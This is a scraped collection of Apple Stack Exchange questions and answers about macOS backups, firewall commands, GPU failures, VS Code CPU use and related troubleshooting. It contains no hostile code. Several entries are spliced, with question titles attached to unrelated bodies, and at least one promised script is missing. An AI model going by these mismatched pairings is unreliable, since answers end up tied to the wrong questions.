drive, and restore al the files you like, or the complete system from a Time Machine backup. Time Machine is well-documented in macOS help and on Apple’s website for more in-depth (and ever changing) information.\n\nA: Time Machine by default backs up nearly everything in your macOS partition. It excludes log files, Spotlight indexes, caches, temporary files and trash (have a look: On OS X, what files are excluded by rule from a Time Machine backup?). The backup includes docker files, npm packages, your personal files etc. When the backup is completed, the hard drive will NOT be bootable, meaning that you can't run macOS from your Time machine backup.\nYou can restore from a Time machine backup without or after installing an operating system. If you restore without installing an operating system:\n\n\n*\n\n*All the backup will be restored to your disk, including the operating system (for example Yosemite). [NOTE: If the Mac you are restoring to does not support the version of macOS in your TM Backup, it will still not be able to boot from the restore].\n\n*It can be done from either Recovery or Installation USB. No internet access is required.\n\n*After the backup is restored, everything will be exactly how it was while you were doing the backup.\n\n\nIf you restore after installing an operating system:\n\n\n*\n\n*Only personal files and the files you select can be restored and will not restore the operating system.\n\n*Might not restore packages, system tweaks and files that are stored in directories other than traditional ones (for example \"/MyApp/mysourcecode.cs\" will not be restored by default).\n\n\nIf you think this contains misinformation, please comment because I never actually restored after an operating system installation.\n\nA: For maximum security, I recommend using Apple Disk Utility to make periodic bootable clones.  Once my wife's Mac laptop was stolen.  She could immediately boot my MacPro from her laptop's clone and be back in business.  A week later she could buy a replacement laptop and clone the clone to it.  Does Time Machine offer such certain salvation?\nApple Disk Utility's cloning function is rock solid, with automatic verification.  Its only limitation is that the clone volume can't be smaller than the original volume (and then to go back it can't be larger).  Possibly Apple Disk Utility got a bad name for cloning when, between OSX 10.10 and OSX 10.12, its GUI changed.  Before, choosing a volume and pressing \"Restore\" set that volume as the source volume.  After, choosing a volume and pressing \"Restore\" set that volume as the destination volume.  Someone used to the earlier GUI could make a huge mistake of wiping what he wants to save.  But pull yourself together and enjoy the reliable Apple Disk Utility for perfect cloning.  Time Machine takes too long, and you never quite know what it's done, or will do when you're in trouble.\n", "Q: Deleting already sent texts If I send a text and then change my mind and delete it, will the other person still see it on their phone?I clicked on the body of the text and the window popped up, giving me the option to delete the message. Does it only delete it on my end or also on the other person's end?\n\nA: I'm assuming you're using Messages on iOS which offers the option to delete your copy of a message. This assumption may not be needed since you can’t delete messages that iOS sends to another device whether it’s SMS / MMS or iCloud delivering it. \nFor messages, after a message is sent it doesn't matter what you do it on your side, it doesn't recall or delete the message on the other person's device(s). \nYou have the option to delete a text or image in order to save space on your device. You don't control the message content on the other device after you press Send. \n", "Q: Is there an easy way to add, modify, or remove what files or URLs are associated with Apps?

There is another FOSS alternative - SwiftDefaultApps which is available on GitHub and via Homebrew.  It's described as a \"Replacement for RCDefaultApps\" and testing has shown that it functions pretty much the same way as the original.  It works on macOS 10.12.x (Sierra) through 10.15.x (Catalina).\n\nThere's a free (as in beer) application that you can use to change how macOS behaves with respect to application associations and URL, protocol, and media handling:  RCDefault App.\n\nRCDefaultApp is a Mac OS X 10.2 or higher preference pane that allows\n  a user to set the default application used for various URL schemes,\n  file extensions, file types, MIME types, and Uniform Type Identifiers\n\nSet Default Apps\nOne of the most convenient uses of this application is to set your default app for common protocols like web browsing or email (setting your default browser or mail apps) or switching FTP from Finder to Firefox or Chrome.  \n\nFile (Extensions) by Application\nOne of the more useful (and global) features is to find out what file extensions are \"assigned\" to a particular application.  For example, here we can see what's associated with Acrobat Pro.\n\nApplications by Extension\nThe flip side to seeing what's assigned to a particular application is to see what application is assigned to a particular extension.  In this case PDF is assigned to Acrobat Pro.  From here, we can change its association to another application (like Preview).\n\nDisable an App\nOne of the more useful tools (extremely useful in Lab or shared environments) is to disable certain apps, extensions, or protocols from ever being opened.  For example, in the example below, Spotify can be disabled and will not open.\n\nInstallation & Use\nIt's an older app and it hasn't been updated since 2009; however, I recently tested it on both El Capitan and High Sierra.\nTested still working on Mojave 10.14.1 at Oct 18.\nAfter downloading and mounting the DMG, simply copy the file RCDefaultApp.prefPane to either of the following directories:\n\n\n*\n\n*/Library/PreferencePanes/ - will be available systemwide for all users\n\n*~/Library/PreferencePanes/ - only availabe to your user profile\n\n\nOpen System Preferences and launch the utility\n\nPricing\nIt's FREE as in beer, but if you do find the utility useful, I encourage you to make a donation.

When I couldn't ping anything I wondered… So, I disabled pfctl with sudo pfctl -d and lo and behold ping and ssh were working again.\nIf pfctl was still running my ruleset regardless of whether the firewall in sys prefs was enabled or not then either:\n\n\n*\n\n*the sys prefs firewall is a separate firewall app, not pfctl given a simple gui (as I'd assumed).\n\n*the firewall in sys prefs is a separate instance of pfctl, both can run independent of the other.\n\n\nor it's something else (I like to give myself leeway). I've checked running processes and can only find Firewall, no pf/pfctl etc, I'm puzzled.\nWhich option is the truth?\n\nA: There's no second instance of pfctl running.  Pretty much everything you have to do with pfctl requires root priviliges.\nFor example, just getting a listing of rules without using sudo gives a \"permission denied\"\n$ pfctl -sr\npfctl: /dev/pf: Permission denied\n\nAdding sudo allows you to view the current rule set:\n$ sudo pfctl -sr\nNo ALTQ support in kernel\nALTQ related functions disabled\nscrub-anchor \"com.apple/*\" all fragment reassemble\nanchor \"com.apple/*\" all\n\nThe issue you may be experiencing might be related to this post:  Application Firewall is not enabling pfctl\n", "Q: Why is a non-cellular iPad model announced as new network interface when connecting to a Mac through USB? Whenever I connect my iPad (non-cellular / wifi-only version, so no sim card and no mobile data connection) to my Mac over USB, I get a dialogue box stating that a new network connection iPad-USB has been found and asking whether I want to configure it. I realize that it in principle is for using the iOS device as mobile hotspot, but with this iPad model it's not even possible to use it as a hotspot. Why does macOS bring up the dialogue nevertheless?\nI would like to prevent this dialogue box from appearing each time I connect the iPad to the Mac. I had the same issue with the iPhone, where I resolved it by activating the mobile hotspot in the system preferences on the iPhone (mobile data section), configuring the network connection iPhone-USB on the Mac, and then deactiving this network connection. With the iPad, this strategy does not work: I can not activate mobile hotspot on this iPad (there's no mobile data section in the system preferences), and I don't even see the iPad-USB interface as an option when trying to add a new network connection in the Mac's network preferences. Yet the dialogue box that appears on connecting is stating just that.\nIn case it matters, the system details are: iPad Pro 2015 (12.9'') with iOS 11.2.5, MacBook Pro 2017 with macOS 10.13.5.\n\nA: You are probably referring to this message:\n\nFrom today's point of view, your Mac's behavior is a bug. Maybe the iPad advertises its Bluetooth to be a network adapter? Like WiFi or cable network adapters, Bluetooth chips have a MAC address. Here, MAC doesn't refer to Apple's computer brand, but to a universally unique identifier. See for example the https://macaddresschanger.com/bluetooth-mac-lookup\niOS does support the Bluetooth personal area network to route data packages to other devices, potentially connecting to their internet:\nhttps://developer.apple.com/documentation/multipeerconnectivity\nTheoretically, the iPad could connect to the Internet via a Bluetooth-based personal area network. Currently however, the iPad's Personal Hotspot feature until iOS 12 only supports sharing cellular data. I am not aware of any plans that might change that. \nMaybe your Mac is ready for the day a future iPadOS or iOS version extends the Hotspot feature to Bluetooth?\nYou can try to log into macOS using an admin account. Maybe the Network Preferences sidebar allows you to delete the iPad. If yes, then you shouldn't see the message anymore when connecting it via USB.\n\nA: From the man page of networksetup:\n     -detectnewhardware\n             Detects new network hardware and creates a default network service on the hardware.\n\nRunning networksetup -detectnewhardware in a terminal while your iPad is connected creates the interface and the message will not appear again.\n", "Q: Combining diacritic marks don't work in iCloud Pages?

On Saturday I got a new iPhone X 256. Previously I had an iPhone 7 128, which I backed up in the AM, and again at the store just for good measure. Everything in iCloud was set to \"On.\" Both backups took under 5 minutes.\nAs expected, we chose Restore from Backup, and once my apps and whatnot started populating on the iPhone X, ATT wiped my iPhone 7 and sent me home.\nThe next morning I opened Photos and now they only go back to May 25, less than a month. On my old phone, they went back to 2010, and there were thousands. All photos on my new phone appear to be in photostream, the Camera Roll is showing 0. None of my Albums loaded (except Photostream). Everything else on my phone appears to have restored perfectly, Chrome even has the same tabs open that I had on my old phone.\nI called Apple Care, and though they \"escalated\" my issue to the engineers, I've been told they were unable to recover any photos from my backup files.\nWhen I wipe my phone and go to Restore from Backup, I have 3 options available: the one I used, one from 2 days earlier, and one from the day before that. I was told by Apple Care that all of these backup files are around 2 GB (i.e. they don't contain photos). They said they were \"Snapshot\" backups, which means that they are new files created since the large backup. When I asked if I could backup from the large backup file, they gave some very vague answers and said that they do not see that file. When I look on my computer at iCloud > Devices > Choose iPhone 7 > Backups, there is an additional backup of 22 GB that has no date and has (incomplete) next to it. Presumably this too has no photos, since there should have been about 80 GB worth of pics. But maybe there are some?\nI haven't backed up to a computer since May 2016. I'm going to try restoring to that file to see if I can recover some photos that way, and maybe \"only\" lose 2 years of memories.\nWhat else can I try to recover these missing photos?\n\nA: I recommend restoring those backups. \niCloud Backups are compressed to save memory. Just because they show lesser GB than the full amount of your photos and videos may have, doesnt mean that they arent there. Also backups are done over time, so the photos and videos are also saved over time, never all at once.\nI would restore from a backup and see what you have. Also when the latest backup was installed, did you have iCloud library turned on in iCloud settings? If so did you have optimize storage turned on? You'll want that off if your iPhone has enough storage for your photos.\nAnd lastly make sure you go to www.iCloud.com since all photos that iCloud can send to your iPhone will come directly from there as well as your backup. See if you can verify that before giving up on the backups.\n", "Q: Finder Icon to Go to Enclosing Directory Finder icon to to navigate up one level to enclosing directory would make my life so much easier. Especially when I have to move up several directory levels.\nI realize there's a keyboard shortcut, but sometimes I navigate via mouse only.\nThere's also a menu option, but that's more involved than just clicking an icon -- which has been available in Linux & windows forever.\nI can't imagine why Apple would not include such a self-evident function, given that they're better in almost every other category of user experience.\nThere was once an app to create such an icon, but I don't think it goes with High Sierra (up to & including Sierra only).\n\ninfo edited in from deleted 'answer'\n\nA: You must have at some point removed this, as it's there by default.\nYou've also changed the toolbar to text view only, so it may have happened at that time.\nRight click anywhere in that top bar & select Customise Toolbar... [It's also in the Finder View Menu.]\nDrag \"Path\" back into the toolbar.\n\nClicking on it reveals the entire hierarchy.\nYou can also Cmd/click on the folder name/icon, top centre of the Finder window.\n\nA: The \"path\" functionality is useful, but I miss the simplicity of the Windows & Linux approach.\nI found this discussion of making a \"one-click, up-one-level\" functionality.\nI'm not sure whether these will work on recent Mac OS versions. Basically, you create an AppleScript that adds a 'Go to Parent Folder' button to the toolbar and then save it as an application:\n\nFirst create an AppleScript app with just this line of code:\n  Blockquote\ntell application \"Finder\" to set target of window 1 to the container ¬\nof target of window 1\n\nThen save it as an application, and quit Script Editor. Now show the\n  contents of the application package you just created by\n  control-clicking on the folder and then choosing Show Package Contents\n  from the pop-up menu. Open the Contents folder and edit the info.plist\n  file in your editor of choice. Adding the following will make the\n  program faceless, so that it does not appear in the Dock when\n  launched:\n<key>NSUIElement</key>\n<string>1</string>\n\nFinally create a nice icon (I made one in Photoshop that looks similar\n  to the navigation buttons, as seen above right), paste it onto the app\n  (in its Get Info window) and drag the app to the Finder toolbar.\n\n", "Q: Can magnetic adapters for USB-C be dangerous? As it is well-known, Apple has scrapped the MagSafe connector. Thanks Apple, was too good to keep :-(\nI'm considering the purchase of one of the many magnetic adapters available on the market. But I've tried this from a colleague and it looks like pins could connect the wrong way when you are fiddling to dock the plug the male in place. The magnet is polarised as to oppose the attempt to connect it in the reverse orientation, so that should be avoidable, but I've tried to slide the two pieces from different angles and I'm afraid it could actually establish the bad contacts.\nAm I worrying needlessly? Is a problem of just this item, or a general one?\nEDIT: clearly, I don't mean dangerous to myself, I'm just referring to the shock signals that might happen in case the pins are connected the wrong way. I'm already aware of possible physical damage to the frame if one leaves the female tip of the adapter plugged when the laptop is on the move.\n\nA: This question/answer is precariously walking the fine line of being opionated.  However, to err on the side of giving an objective view, I wanted to post an answer to address the \"dangerous\" question posed in the title and what a real-world, potential risk may be.\n\nCan magnetic adapters for USB-C be dangerous?\n\nTo you, personally?  No.\nTo your MacBook?  Unlikely.\nMacBooks have a clever bit of circuitry (adapter sense logic gate) to prevent high voltages from reaching the SMC.  If you happen to mess up the connections, it will kill the DC-in board before it fries your logic board.\nHowever....\nWhat you have to remember when using gadgets like this is that in the end, no matter how polished they are, they are hacks (or as I like to call them \"bodges\").  Hacking is good when you're in a jam with nothing else, but as an everyday thing, I find them more trouble than they are worth.\nHow so?\nConsider the original MagSafe was built into the MacBook.  Unless you set out to actually destroy it, it wasn't going to get damaged by normal every day use.  \nThis little adapter into your USB port is something that sits proud of the MacBook frame and exposes the port to damage from accidental bumps and bruises that come with everyday use.\nIn other words, imagine \"sliding\" your MacBook with this adapter sticking out into your case/backpack/bag/etc. and the adapter catching on something.  The torque (the fulcrum will be the point where the MacBook and adapter meet) it will experience may be enough to break the connectors on the logic board.\nAre they convenient?  Sure.  Is a broken port worth it to me?  No.\n", "Q: Create ZIP files from containing related files from multiple folders Is there a way to automate creation of ZIPs containing files with common name elements?\nWhat I have are multiple variations of the same image:\nfiles/2250/8199print.jpg\nfiles/1200x1200/8199square.jpg\nfiles/1200x900/8199wide1.jpg\nfiles/1200x628/8199wide2.jpg\nfiles/480x360/8199small.jpg\nWhat I'd like to do is create some sort of application that goes into folders, finds related files (all contain \"8199\") and then archives them all into a new file named \"cartoon8199.zip\".\nI tried to create an Application via Automator, but couldn't figure out how to make the Name Contains field in Find Finder Items include a variable.\nAny ideas on how to achieve this?\nI'm on a Mac running HighSierra 10.13.3.\nThanks in advance!\n\nA: Heres your script as promised.

For section titles, grepping only seems to work for the first 2 characters; this is consistent across a few different section titles we tried. For the rest of the content, grep seems to work as expected.\nI ssh'd into a non-BSD flavored Linux box (Amazon Linux) and it does not appear to exhibit the same behavior.\nWhat's going on here?\n\nA: You can see what is happening if you view the raw codes within a man page. One way to do this is to export the man page to a file and inspect its contents directly:\nman ls > man.ls\nnano man.ls\n\nThe word \"BUGS\" actually looks like this in the file:\nB^HBU^HUG^HGS^HS\n\nYou'll see that the headers contain formatting characters, so the entire word \"BUGS\" is not present.\n\nIf you want to access the plaintext contents of the manual page, you can use the command\nman -P cat <thepage>\n\nThe -P option sets the pager on other unix and cat will ignore the formatting information, giving a plaintext output. However, this doesn't appear to work on macOS, so the output needs a manual col -b step in the pipeline:\nman ls | col -b | grep BUGS\n\n", "Q: Mac OS 10.13.5 - Dual monitor set up for MacBook with single USB-C I see that a lot of people are having issues with connecting dual monitors.\nI currently have the USB-C Digital AV Multiport Adapter - with one HDMI cord and it works with 1 of 2 monitors.

I'm using Gopro Fusion Studio to render 5.2k content before editing with Adobe Premiere. I never had problems rendering 4k but 5.2k makes the app crash. \nMy Mac:\nMacOS Version: 10.13.5\nModel: MacBook Pro (13-inch, Mid 2012)\nProcessor: Intel Core i7 2.9Ghz\nMemory: 8Gb 1600MHz DDR3\nGraphics: Intel HD Graphics 4000 1536Mb\nSSD disc \nBut I can render with this Mac:  \nMacOS Version: 10.12.6\nModel: MacBook Pro (Retina 13-inch, Early 2015)\nProcessor: Intel Core i5 2.7Ghz\nMemory: 16Gb 1867MHz DDR3\nGraphics: Intel HD Graphics 6100 1536Mb\nSSD disc \nI took some screenshots of Activity Monitor when rendering with my Mac:  \n\n\n*\n\n*After reboot\n \n\n*Fusion Studio open ready to render\n \n\n*While rendering before a crash   \n\n\n*After app crash\n\nI admit that my computer may be in the minimum viable threshold regarding Gopro's minimum system requirements. And this got me wondering if upgrading to 16Gb 1600MHz DDR3 would make any difference or if the major problem is with my GPU.\nThanks for your time.\n\nA: Only you can answer the question as to whether an upgrade is worth it or not, but I do have some observations to make.\nFirstly, your mid-2012 13\" MBP doesn't actually meet the system requirements in terms of GPU. The page you reference specifies the following GPU requirements for macOS:\n\nIntel Iris Pro Graphics (MacBook Pro 13'' or 15'' mid-2015)\n  Recommended: Dedicated GPU like AMD Radeon R9 M370X or better\n  Minimum Video RAM: 4 GB RAM\n\nThat is, the minimum is a 13\" MBP from 2015 and yours is from mid-2012. This implies as a minimum you'd need an Intel Iris Pro 5200, not the 4000 series you have. The 13\" early-2015 model you have that works better has the Intel HD Graphics 6100 which can use up to 1.5GB of your RAM.\nThe second observation is that the specs of your mid-2012 MBP's GPU is that it can only use up to 1GB of RAM, not the 1,536MB you specify in your question. \nSo, while I'm a big believer in having more RAM, in this case for this specific purpose it's probably not going to add much life to this machine. Sure, it's worth doing for other uses (especially since the Intel HD Graphics 4000 uses up to 1GB of your MBP's RAM for its VRAM, so having more is going to be useful when running multiple apps simultaneously), but the benefit you'll get with Gopro Fusion Studio to render 5.2k content is questionable since you don't meet the minimum GPU specs anyway.\n", "Q: Visual studio Code maxs out my CPUs even when its just open I have been learning python using VScode. I've noticed recently that as soon as I start VScode my CPUs get maxed out and my whole computer is sluggish. When I run the activity monitor I see as many as 5 rg processes running and up to 4 'Code Helper' processes. These processes use up to 125% of CPUs. When I quit VScode, the Activity Monitor still reports a lot of cpu percentage for 'Code Helper', and continues reporting that for over 20 minutes after I quit VScode. Does anyone have any idea why VScode is using so much cpu time?  I'm using the latest VScode on my iMac running High Sierra 10.13.5 and VScode version 1.24.1\n\nA: High CPU is caused most probably by some VS Code extensions. Try running VS Code with all extensions disabled and check if You still experience such CPU.\nFrom my experience the Import Cost extension can cause quite high CPU load..\nIf the CPU is allright with extensions disabled try enabling it one-by-one (work a little bit between enabling every next one) and try to locate which extension is a real CPU eater.\nHere is a very good article about troubleshooting performance issues with VS Code: \nhttps://github.com/Microsoft/vscode/wiki/Performance-Issues\nGood luck!\n\nA: For those happy in the terminal, there might be a shortcut to experimenting to see which extension is at fault\nJust had to solve it so thought I'd share what I found (yes, this approach ought to work on Linux as well)..\nFirst, my top command had this to say.  Note that PID - 22032 - and that Code Helper is the guilty party (note: the issue was fixed before I posted this so I can't re-run top and get its output as text).\n\nHowever... Code Helper provides shared services around many extensions so that doesn't tell you which one is bad.\nNext, step, what's at 22032?\nWell, I figured it was searchable by pgrep so I ran this:\n(note that there is specifically an .vscode/extensions/xxx argument to this Code Helper).\npgrep -lafi 'Visual Studio Code.app'\n\n... other VS Code PIDs ...\n\n22032 /Applications/Visual Studio Code.app/Contents/Frameworks/Code Helper.app/Contents/MacOS/Code Helper --ms-enable-electron-run-as-node \n/Users/me/.vscode/extensions/ms-python.vscode-❌pylance❌-❌2022.10.30/dist/server.bundle.js --cancellationReceive=file:6fcd56f299db327bd6a77767eb05e4f2ba27254a98 --node-ipc --clientProcessId=19541\n\n... other VS Code PIDs ...\n\n\nFor some reason pylance had been acting up and wouldn't quit even when VSCode was down.

I am a little surprised to discover that the iMac Pro does not have a digital optical audio input (TOSLINK/SPDIF), which is something I've been relying on with the Mini for audio capture, for I have a piece of home studio equipment that only has an optical digital output.\nI thought there might be an external USB-C audio capture device on the market instead, but a look through online stores doesn't offer any hobbyist-level solution (there is high-end pro audio gear that is way beyond my price bracket or needs).  A few devices do analogue input (such as the Griffin iMic and the Behringer Uca202), but that's not what I'm after; neither can do optical/digital input.\nThe search is hindered by all the output devices showing up from the same query, so perhaps I missed something. It seems like an obvious device to offer.\nHas anyone solved this problem? What are my options?\n\nA: I found a USB device that captures optical input.

Discovered this neat project to pull detailed magnetometer data from iOS: https://github.com/foundry/MagnetoMeter\nI've been looking at different approaches to setting up a 24/7 magnetometer to monitor solar activity. One option was to set up an old iPhone 6 and beam the data over wifi to a server. However, I'm unfamiliar with the iPhone's hardware and sensitivity.\nIs the built-in magnetometer going to be sensitive enough to detect solar storms?\n\nA: I don't think anyone here will be able to give you a definitive answer to this, unless of course they've tried to do something similar.\nApple only provides very basic specs in terms of its sensors (e.g. accelerometer, gyro, proximity, compass, barometer, etc) and doesn't go into their individual specifications.\nHowever, considering that anyone can build a magnetometer from easily available materials to measure slight changes in Earth’s magnetic field due to solar storms, my guess would be that an iPhone's magnetometer will pick up on these fluctuations as well.

I downloaded the app and switched back to the Turkish App Store ID. \nWill the installed app from the U.S. store continue to get updates regularly?\n\nA: Yes and no. Let me explain:\n\n\n*\n\n*You will be able to update the app, but only by logging into the same U.S. Apple ID you used to download the app. You cannot download updates any other way.\n\n*Since the app in question is not available in the Turkish App Store, you're also not going to get notified via the App Store of any available updates (i.e. unless you are logged in with the U.S. Apple ID you used to download the app).\n\n*However, depending on the app itself, you may get a notification from the developer via the app when an update is available, in which case you know to log in with the U.S. Apple ID you used to download the app in order to install the update.\n\n*In the event that the app becomes available in the Turkish App Store at a later date, you will actually start to get notifications via the App Store app when updates are available. However, you would still need to log into the U.S. Apple ID you used to download the app in order to install the update.

Following this guide and substituting GeForce for AMD, I've been able to get my mid-2012 MacBook Pro Retina functional again, albeit without the advantages of the discrete GPU (background: original GPU failed sometime between 2013 and Oct 2017 but machine continued to function and I had no reason to check for the GPU until Oct of 2017, Apple replaced logic board Jan 23 2018, second GPU failed most likely on last Friday evening and machine refused to boot at all).\nThe only problem, or at least the only one that I'm going to worry about, is that things are running a bit hot. Is there any way through software that I can either power down or throttle the GPU? At least I assume from the information in that guide that it is the GPU causing extra heat due to there not being any drivers loaded to control it.\n\nA: gfxCardStatus is a menu bar app that lets you choose which of the integrated or discrete GPU is active. \nI believe if you choose 'integrated only' the dedicated GPU won't be used. Just remember to set it each reboot, I haven't found a way to get it to remember settings across shutdowns.\n", "Q: WiFi internet connectivity issue iPhone 8 Connected to AirPort Time Capsule 802.11ac (network name BZ), which is connected to a new cable modem (just moved to new building/ISP).

All the answers I've seen involve duplicating or restoring an existing OS.  Is there a way to do it from scratch?  \n\nA: \nIs is possible to get a late 2010 iMac with a blank/new hard drive up and running with the latest OS and XCode?\n\nYes.  The late 2010 iMac (both 21\" and 27\" models) had the capability of having their EFI upgraded to support Internet Recovery.\nThere are a few caveats here:\n\n*\n\n*Internet Recovery (hold ⇧Shift⌥Option⌘CommandR) will install the last version that was installed on that Mac.  If it's pre High Sirra, you'll have to install that version then upgrade.\n\n\n*The EFI should have been patched via normal system upgrades.  It's unlikely that the iMac wouldn't have been upgraded in the last 8 years, but if it hasn't, you need to install Lion (10.7.3) and then install the patch (download here)\n\n\n*You need a \"decent\" Internet connection.  You'll be downloading not just the installer, but the entire OS.  If your connection is flaky, it's likely to fail.\nOptions\n\n*\n\n*Use Internet Recovery as detailed above\n\n*Take to an Apple Store and they will assist with the download and install\n\n*Have a friend, colleague, or family member create a USB installer for you.\n\nFinally...\nOnce you have your system installed (even before you install XCode), do a Time Machine backup so that you have an image of your system in it's pristine state in case you have to install macOS on a blank drive again.\n\nA: Yes.\nYou can install macOS Sierra as per the Apple support document, macOS Sierra - Technical Specifications.\nYou can download macOS Sierra by following the instructions in the Apple support document, How to download macOS Sierra.\nOnce downloaded, create a bootable USB key by following the instructions in this Apple Support article, How to create a bootable installer for macOS.\nOnce the bootable USB key is created, restart your Mac, press and hold the Option key and select the USB key to boot from USB. Thereafter you can proceed to format and install macOS on Hard disk.\nOnce macOS is installed, the last supported version of Xcode can be installed from Mac App Store.\nNote: You'll need access to a working Mac to download the installer and create the bootable USB key.\n", "Q: Early 2011 Macbook Pro faulty GPU or Logic Board? I have a 15\" Macbook Pro from early 2011 and am trying to figure out whether the logic board is broken.\nBackground and Original Symptoms\nIn 2016, my Macbook first showed signs of a broken GPU. Since at the time Apple's repair extension program was still in place, I got the logic board replaced for free. However, about a month ago it died again with the same symptoms. I send it in to a third party repair shop to replace the GPU. It worked fine for a while, but about a week ago it randomly shut down again. I later found a couple of Kernel Panic Reports that indicated a GPU restart 4 times with 10 seconds apart the heades of which looked like this:\nTue Jun 19 15:10:16 2018\n\nEvent:               GPU Reset\nDate/Time:           Tue Jun 19 15:10:16 2018\nApplication:         Adobe CEF Helper\nPath:                \nTailspin:            /Library/Logs/DiagnosticReports/gpuRestart2018-06-19-151016.tailspin\nGPUSubmission Trace ID: 0\nOS Version:          Mac OS X Version 10.13.4 (Build 17E199)\nGraphics Hardware:   AMD Radeon HD 6490M\nSignature:           0\n\nReport Data:\n\nGPURestartReportStart\n------------------------\nHung Channels: PM4 \n------------------------\n[00] AccelChannel: PM4\nPending Command from   : GLCtx\nPendingCommandTimestamp: 0x00129836, TotalDWords: 0x00000d20, GART Offset=0x0000000010fe4000, stamp_idx=0, estamp=0x00129836\n------------------------\n[00] PM4 HWChannel  : Enabled, NotIdle\nLastReadTimestamp   : 0x00129835\nNextSubmitTimestamp : 0x00129870\n[PM4, ts:0x00129836]: No semaphore wait\n[PM4, ts:0x00129836]: semaphore  signal: 0xffffff8019d0a940\nHWSemaphore 0xffffff8019d0a940 Signal Event: [PM4 channel[0] TS:0x00129836 lastReadTS:0x00129835]\n------------------------\nGPU HangFlags 0x00000004: AsicHangState 0x00000004, AsicResetRequirement 0x00000002\nIndividualEngineHang: 0\nNonEngineBlockHang  : 0\nFenceNotRetired     : 1\nPerEngineReset      : 0\nFullAsicReset       : 1\nHangEngineBitmap    : 0x00000000\n------------------------\nAMDCaicosGraphicsAccelerator PCIe Device: [1:0:0] State: ENABLED\nConfiguration: deviceBits: 0x02006760, capabilityBits: 0x30940100\nTotalVideoRAMBytes: 0x0000000010000000 (268435456)\n------------------------\n[00]  PM4 Engine : Enabled,  NotIdle\n[00]  PM4 Channel: Enabled,  NotIdle, lastReadTimestamp 0x00129835, nextSubmitTimestamp 0x00129870\n------------------------\n[01] SDMA Engine : Enabled,  Idle\n[01]  DMA Channel: Enabled,  Idle, lastReadTimestamp 0x00002ccb, nextSubmitTimestamp 0x00002ccd\n------------------------\n[03]  UVD Engine : Disabled, Idle\n[02]  UVD Channel: Disabled, Idle, lastReadTimestamp 0x00000000, nextSubmitTimestamp 0x00000001\n------------------------\n[04] SAMU Engine : Disabled, Idle\n[03]  SPU Channel: Disabled, Idle, lastReadTimestamp 0x00000000, nextSubmitTimestamp 0x00000001\n------------------------\n: ** GPU Debug Info Start **\n.....\n: ** GPU Debug Info End **\n------------------------\n[00] HWRing: Enabled\nRingSizeInDwords: 0x4000,  FreeSpace: 0x317f, Head: 0x00000f40, LastSubmitPosition: 0x00001dc0, Tail: 0x00001dc0\nRB[0]_RPTR: 0xffffffff, RB[0]_WPTR: 0xffffffff\nHWRingDumpStart:\n.......\n\nFollowing this the Macbook would turn on again and continued to work for about a day, however, at one point after putting it in sleep mode it failed to shutdown and ran for an hour in my laptop case running considerably hot. After that I wasn't able to boot it normally anymore. Booting in safe mode would work relatively consistently, however, it would still sometimes crash and after crashes or trying to boot it regularly, it wouldn't turn on for a couple of times (usually two or three) even in safe mode with only the white indicator light repeatedly blinking three times in a row. At no point would I get a startup chime or the three beeping sounds that can indicate a failed boot.

There is another kernel panic report indicating the same last loaded and unloaded kexts (also in single user mode).\nTroubleshooting\nI have tried the Apple Hardware Test via Internet Recovery Mode at multiple stages. The non extensive test would not result in any errors at first, however, at later times (after trying to disable the discrete GPU) even if booting into Internet Recovery, the Macbook would freeze or crash during the test.\nThinking at this point, that the GPU was at fault I tried the method explained by LangLangC in this question GPU Problem, setting an nvar variable in order to stop the Macbook from using the discrete GPU on boot.\nFollowing that method, however, I was still not able to boot regularly and the Macbook basically showed the same symptoms as before. I installed gfxCardStatus during a safe boot and was surprised to see that apparently my Macbook was (and still is) constantly running on the discrete GPU. Force switching to the integrated GPU would not work (even with trying to select it multiple times which is apparently a well known bug for gfxCardStatus). \nBy now thinking that it might be a case of bad RAM I reversed the hack by resetting SMC and PRAM deleting all NVAR variables and moving the kext file back to its original place as well as updating the caches. I then tried reseating the RAM and tested the individual modules. \nCurrent Situation\nIt turned out that even without the hack the Macbook will boot regularly if only the upper slot of RAM is in use. Whenever there is RAM installed in the lower slot, it shows the same symptoms as before. When booting with only one RAM module in the upper slot, the Macbook shows graphic glitches when scrolling or changing windows that are seemingly exactly the same as in safe mode. \ngfxCardStatus and the System Report still show that only the discrete GPU is being used. Switching to the integrated GPU via gfxCardStatus does not work although it is recognized and listed in the System Report and Dynamic Switching is enabled. There is still no startup chime and although the sound works it does not appear to be as loud as usual. A while ago my screen went black for a short while before turning on again only for the Macbook to crash a minute later. \nAt this point I have no idea what else could help or what might be causing this kind of behaviour. If the discrete GPU is at fault why is my Macbook apparently using it constantly and why would it only boot when only one RAM slot is in use? And if the logic board is at fault, how come the symptoms first appeared after multiple GPU restarts, why can't I switch to the iGPU and why do I experience graphic glitches when not in safe boot?

After i get the parts and firstly i check for the iphone whether it still alive or not, i connect the iphone to the itunes and i found the iTunes detected my device but i cant access because it need to unlock first. so i tried to connect the LCD and i found that the LCD was black and didnt have any visual. i wonder is it damage from the new LCD it self or it was from the logic board it self? i was worried if i get the new lcd and it still didnt work. i also try to put my simcard and the iphone still can receive the call, is this really means that my phone still can be saved?

I'm trying to get a hold of the Kernel Headers for 10.14 Mojave, but even though the Beta version (even two actually) was already released, XNU's repository (both here and here) is still only up-to-date with High Sierra.\nI also tried getting Command Line Developer Tools but they only contain User Headers (and maybe a few but not a lot of Kernel Headers). \nAnything else I could do? I don't really need the Kernel source as a whole, only its headers. \n\nA: Apparently XCode command line tools doesn't install the headers by default anymore. However, it does provide a package in /Library/Developer/CommandLineTools/Packages. On my system it was /Library/Developer/CommandLineTools/Packages/macOS_SDK_headers_for_macOS_10.14.pkg. I installed this package and then the headers showed up in /System/Library/Frameworks/Kernel.framework/Headers.\n\nA: No, nothing else you can do except contact Apple.\n", "Q: How to selectively install new macOS features on my old and slow iMac? I want to install macOS Mojave on my mac.\nMy mac is highly customized, I have disabled certain things, deleted many useless extensions and processes along with some default macOS apps and services.\nNow, the problem is whenever I install a new macOS update all the above said things reappears or gets re-enabled now turning everything off/disabling each and every services/extensions becomes an hectic process.\nMy question, how can I selectively update to a new version of macOS like I want only the dark mode feature to be installed on my mac (without screwing anything), how can I achieve this process of selective installation\n\nA: The macOS installer does not provide the functionality you are seeking. With the default update process your goals are simply unachievable.\nThat is: my firm recommendation is: do not try this and be careful with the following.\n\nThat said, if Pacifist works with Mojave (not tested):\n\n\n*\n\n*you might want to disable automatic updates\n\n*you might try to download a standalone updater from Apple, when it becomes available\n\n*you open the resulting installer package in Pacifist and look for all the features you want and install only those, ignoring the rest.\n\n\nLooking at the size of the packages Apple distributes these days it seems quite questionable if this route is even remotely able to provide you with even the slightest advantage regarding time. The possibility to screw 